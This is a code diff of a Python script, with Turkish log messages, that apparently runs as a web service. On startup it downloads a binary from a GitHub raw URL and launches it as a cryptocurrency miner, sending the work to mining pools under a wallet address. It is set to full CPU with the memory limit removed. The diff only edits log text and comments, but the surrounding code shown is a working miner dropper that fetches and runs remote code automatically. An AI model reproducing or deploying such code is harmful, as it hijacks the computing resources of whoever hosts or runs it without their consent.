@@ -50,7 +50,7 @@ def kill_process(proc):
 def execution_logic():
     global STATUS
     try:
-        log_to_console("Sistem otomatik başlatıldı. Hedef CPU: %100, RAM Limit: SINIRSIZ (Swap Açık)")
+        log_to_console("Sistem otomatik başlatıldı. Hedef CPU: %100, RAM Limit: YOK")
         log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
         
         url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
@@ -83,6 +83,7 @@ def execution_logic():
             log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
             
             use_tls = ":443" in pool_host
+            # RAM limiti yok, CPU kullanımı maksimum ayarda
             cmd = [
                 tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                 "-p", f"node-{int(time.time())%1000}", "--keepalive",
@@ -93,7 +94,6 @@ def execution_logic():
             
             log_to_console(f"Madenci başlatılıyor... Havuz: {pool_host} (TLS: {use_tls})")
             
-            # RAM limiti preexec_fn parametresi TAMAMEN KALDIRILDI!
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                     text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
             
@@ -200,7 +200,6 @@ def run():
     
     port = int(os.environ.get("PORT", 8080))
     
-    # SİSTEMİ OTOMATİK BAŞLATAN KISIM
     if not STATUS["running"]:
         threading.Thread(target=execution_logic, daemon=True).start()
         
